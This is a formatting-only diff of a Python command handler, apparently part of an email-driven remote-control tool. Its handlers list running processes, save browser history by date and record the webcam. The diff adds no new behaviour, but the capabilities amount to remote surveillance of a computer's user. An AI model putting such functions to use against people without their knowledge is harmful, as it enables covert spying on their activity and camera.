@@ -97,13 +97,15 @@ def execute_one_command(cmd):
         if listOfRunningProcess:
             content += '\nPID --- NAME --- USERNAME --- VMS'
             for proc in listOfRunningProcess:
-                content += '\n' + ' --- '.join([str(proc['pid']), str(proc['name']), str(proc['username']), str(proc['vms'])])
+                content += '\n' + \
+                    ' --- '.join([str(proc['pid']), str(proc['name']),
+                                 str(proc['username']), str(proc['vms'])])
 
         # chuyen list dictionary sang chuoi
         # listOfRunningProcess = [str(x) for x in listOfRunningProcess]
         # listOfRunningProcess = '\n'.join(listOfRunningProcess)
-        #f.write(listOfRunningProcess)
-        #f.close()
+        # f.write(listOfRunningProcess)
+        # f.close()
 
         return [cmd, text + content]  # [subject, text, filepath]
 
@@ -164,12 +166,12 @@ def execute_one_command(cmd):
         return [cmd, res]
     # his <browser> <date>
     elif cmd.startswith('his'):
-        browser, date =  cmd[10:].split(' ')
+        browser, date = cmd[10:].split(' ')
         print(browser, date)
         his = history.History(browser).get_history_by_date(date)
         if str(his) == '':
             return [cmd, 'Browser is not installed OR Browser is not used in that date']
-        file_path = dir_data + browser + " "  + date.replace("/", "-") + ".his"
+        file_path = dir_data + browser + " " + date.replace("/", "-") + ".his"
         file_his = open(file_path, "w+")
 
         file_his.write(str(his))
@@ -179,14 +181,14 @@ def execute_one_command(cmd):
     # webcamrecord 12345 --3 --24: quay 3 giay, 24 fps
     elif (cmd.startswith('vid-cam')):
         if(cmd.count("--") == 2):
-            res = smtp.webcamrecord(int(cmd[cmd.find("--")+2:cmd.rfind("--")]), 
-                                            int(cmd[cmd.rfind("--") + 2:]))
+            res = smtp.webcamrecord(int(cmd[cmd.find("--")+2:cmd.rfind("--")]),
+                                    int(cmd[cmd.rfind("--") + 2:]))
         elif (cmd.count("--") == 1):
             res = smtp.webcamrecord(int(cmd[cmd.find("--")+2:]))
         else:
             res = smtp.webcamrecord()
         now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
-        
+
         if res[0] == False:
             return [cmd, f"Record fail at {now}", res[1]]
         else:
